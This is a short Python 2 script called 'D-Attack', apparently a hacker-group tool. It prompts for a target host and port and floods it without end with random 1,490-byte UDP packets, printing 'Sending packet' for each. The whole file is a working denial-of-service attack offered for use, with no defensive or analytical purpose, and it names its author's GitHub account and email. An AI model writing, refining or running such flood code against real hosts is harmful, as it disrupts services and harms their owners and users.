import os
import time
import socket
import random
import pyfiglet
from termcolor import colored as color

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
print color(pyfiglet.figlet_format('D-Attack'), 'green')
print
print 'Author	:	Lucifer'
print color('Github	:	github.com/luciferpy', 'cyan')
print color('Mail	:	luciferpy60@gmail.com', 'red')
print color('Special Thanks to Myanmar Anonymous Family', 'blue')
print
terget = raw_input("Enter your terget: ")
port = int(input('Enter port: '))
try:
	ip = socket.gethostbyname(terget)
except:
	print 'Error '
	
os.system("clear")

print '[+] Terget site ' + terget
print '[+] Terget IP: ' + ip
print '[+] Port: ' + str(port)
print
print color('[INFOMATION] ' + ip +':' + str(port), 'red')
time.sleep(2)

while True:
	try:
     		sock.sendto(bytes, (ip, port))
     		print color('		Sending packet', 'green')

	except:
		print ' '
		print '[!] Attack Stopped...'
		print '		[-] Check your internet connection'
		print '		[-] Your IP may be baned'
		print '		[-] Server maybe down'
		break

